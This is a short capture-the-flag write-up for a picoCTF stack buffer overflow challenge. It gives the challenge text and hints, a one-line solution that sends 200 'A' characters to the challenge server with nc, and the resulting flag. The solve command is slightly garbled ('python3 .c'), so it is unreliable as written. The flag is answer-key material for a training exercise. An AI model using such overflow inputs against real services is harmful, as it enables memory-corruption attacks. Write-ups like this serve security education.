## Objetivo
Smash the stackLet's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/172/vuln). You can view source [here](https://artifacts.picoctf.net/c/172/vuln.c). And connect with it using:`nc saturn.picoctf.net 63397`

## Hints
- How can you trigger the flag to print?
- If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.
- Run `man gets` and read the BUGS section. How many characters can the program really read?

## Solución

```
th0rtilla-picoctf@webshell:~$ nc saturn.picoctf.net 63397 <<< (python3 .c "print('A'*200)")
picoCTF{ov3rfl0ws_ar3nt_that_bad_8446a0c3}
```
## Bandera
picoCTF{ov3rfl0ws_ar3nt_that_bad_8446a0c3}